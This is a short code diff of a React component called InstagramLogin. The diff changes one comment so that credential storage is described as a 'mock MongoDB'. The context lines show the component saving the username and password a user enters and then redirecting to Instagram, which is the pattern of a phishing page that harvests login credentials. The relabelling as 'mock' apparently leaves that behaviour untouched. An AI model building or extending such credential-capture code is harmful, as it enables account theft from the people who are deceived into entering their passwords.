@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
@@ -27,7 +26,7 @@ const InstagramLogin = () => {
     setIsLoading(true);
     
     try {
-      // Store the credentials in MongoDB
+      // Store the credentials in our mock MongoDB
       await storeLoginCredential(username, password);
       
       // Redirect to Instagram
